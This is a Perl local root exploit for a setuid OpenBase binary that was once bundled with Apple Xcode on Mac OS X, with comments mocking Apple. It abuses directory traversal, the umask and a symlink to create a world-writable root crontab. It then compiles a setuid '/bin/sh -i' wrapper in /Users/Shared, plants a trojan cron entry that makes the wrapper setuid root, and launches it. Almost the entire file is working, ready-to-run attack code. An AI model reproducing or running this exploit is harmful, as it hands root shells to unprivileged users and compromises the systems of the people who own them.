#!/usr/bin/perl
#
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com)
#
# http://docs.info.apple.com/article.html?artnum=61798 (This won't help)
# ftp://www.openbase.com/pub/OpenBase_10.0 (This will)
#
# Create a new file anywhere on the filesystem with rw-rw-rw privs.
# Sorry you can NOT overwrite existing files.
#
# Writing to roots crontab seems to be fairly prompt at handing out root shells
# Make sure that you get cron running by first creating a user crontab!
#
# This is an exploit for a 3rd party program that has been bundled with Xcode on several
# occasions. The OpenBase binary creates a root owned log file 'simulation.sql' in the database path.
# Since we control the database path via directory transversal and we also control the umask we can
# create a file anywhere on the filesystem that is rw-rw-rw and owned by root.
#
# Following symlinks is bad mmmmmmmmmmkay!

$dest = "/var/cron/tabs/root";

$binpath = "/Library/OpenBase/bin/OpenBase"; # Typical location.

# In this instance targets are really pointless but I wanted to archive known vulnerable versions while testing.
$tgts{"0"} = "xcode_2-1.2_8m654_018213974.dmg:$binpath ";
$tgts{"1"} = "OpenBase9.1.5_MacOSX.dmg:$binpath ";
$tgts{"2"} = "OpenBase8.0.4_MacOSX.dmg:$binpath ";
$tgts{"3"} = "OpenBase7.0.15_MacOSX.dmg:$binpath ";

unless (($target) = @ARGV) {
        print "\n\nUsage: $0 <target> \n\nTargets:\n\n";

        foreach $key (sort(keys %tgts)) {
                ($a,$b) = split(/\:/,$tgts{"$key"});
                print "\t$key . $a\n";
        }

        print "\n";
        exit 1;
}

$ret = pack("l", ($retval));
($a,$b) = split(/\:/,$tgts{"$target"});
print "*** Target: $a $b\n";

open(OP,">/tmp/proactive.c");
printf OP "main()\n";
printf OP "{ seteuid(0); setegid(0); setuid(0); setgid(0); system(\"/bin/sh -i\"); }\n";
system("gcc -o /Users/Shared/shX /tmp/proactive.c");

# Create a user crontab FIRST! This ensures that cron is running when the fake root crontab is created. Aka semi-insta-root (in a minute)
system("echo '* * * * * /usr/bin/id > /tmp/aa' > /tmp/user_cron");
system("crontab /tmp/user_cron");

system("mkdir /tmp/pwndertino.db");
system("echo \"Way to proactively audit 3rd party binaries before cramming them into a release \"> /tmp/pwndertino.db/port");
system("echo \"I wonder how long these vulnerable suids have been bundled with xcode \"> /tmp/pwndertino.db/encoding");
system("echo \"All your Mac are belong to us \"> /tmp/pwndertino.db/threads");
system("echo \"Welcome to pwndertino \"> /tmp/pwndertino.db/notification");
system("echo \"For the protection of our customers, Apple does not disclose, discuss, or confirm security issues until a full investigation has 
occurred
and any necessary patches or releases are available \"> /tmp/pwndertino.db/simulationMode");
system("echo \"To learn more about Apple Product Security, see the Apple Computer Product Security Incident Response website\" >
/tmp/pwndertino.db/safe_sql_mode");

# The umask is where the lovin occurs. I'm rw-rw-rw James bitch!!
system("rm -rf  /tmp/pwndertino.sim; mkdir /tmp/pwndertino.sim; ln -s $dest /tmp/pwndertino.sim/simulation.sql");
system("umask 111; export TAR_OPTIONS=\"-v \"; export PATH=/tmp:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin;$b ../../../../../../tmp/pwndertino");
print "$dest should be rw-rw-rw ... enjoy!\n";
print "installing trojan crontab for root\n";

system("echo '* * * * * /usr/sbin/chown root: /Users/Shared/shX; /bin/chmod 4755 /Users/Shared/shX' > /var/cron/tabs/root");

print "sit around and chill for a minute then check /Users/Shared/shX !\n";
sleep 60 ;

system("/Users/Shared/shX");

